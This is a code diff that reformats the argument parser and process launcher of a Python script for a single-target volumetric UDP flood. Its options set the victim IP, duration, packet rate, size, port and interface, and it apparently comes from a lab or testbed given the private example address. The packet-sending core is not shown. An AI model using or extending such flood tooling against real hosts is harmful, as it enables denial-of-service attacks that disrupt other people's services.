@@ -65,30 +65,39 @@ def launch_attack(
 def parse_args(argv: list[str]) -> argparse.Namespace:
     parser = argparse.ArgumentParser(
         description="Single-target volumetric UDP flood. Sends a fixed packet "
-                    "repeatedly to one destination for a bounded duration.",
+        "repeatedly to one destination for a bounded duration.",
     )
     parser.add_argument(
         "target_ip",
         help="victim IP address (e.g. 10.0.0.64)",
     )
     parser.add_argument(
-        "--duration", type=int, default=DEFAULT_DURATION,
+        "--duration",
+        type=int,
+        default=DEFAULT_DURATION,
         help=f"flood duration in seconds (default: {DEFAULT_DURATION})",
     )
     parser.add_argument(
-        "--rate", type=int, default=DEFAULT_RATE,
+        "--rate",
+        type=int,
+        default=DEFAULT_RATE,
         help=f"packets per second (default: {DEFAULT_RATE})",
     )
     parser.add_argument(
-        "--packet-size", type=int, default=DEFAULT_PACKET_SIZE,
+        "--packet-size",
+        type=int,
+        default=DEFAULT_PACKET_SIZE,
         help=f"packet size in bytes including L2/L3/L4 headers (default: {DEFAULT_PACKET_SIZE})",
     )
     parser.add_argument(
-        "--dport", type=int, default=DEFAULT_DPORT,
+        "--dport",
+        type=int,
+        default=DEFAULT_DPORT,
         help=f"destination UDP port (default: {DEFAULT_DPORT})",
     )
     parser.add_argument(
-        "--interface", default=None,
+        "--interface",
+        default=None,
         help="network interface to send packets on (default: auto-select via psutil)",
     )
     args = parser.parse_args(argv)
@@ -111,7 +120,14 @@ def main(argv: list[str] | None = None) -> None:
     )
     proc = Process(
         target=launch_attack,
-        args=(args.target_ip, args.duration, args.rate, args.packet_size, args.dport, args.interface),
+        args=(
+            args.target_ip,
+            args.duration,
+            args.rate,
+            args.packet_size,
+            args.dport,
+            args.interface,
+        ),
     )
     proc.start()
     try:
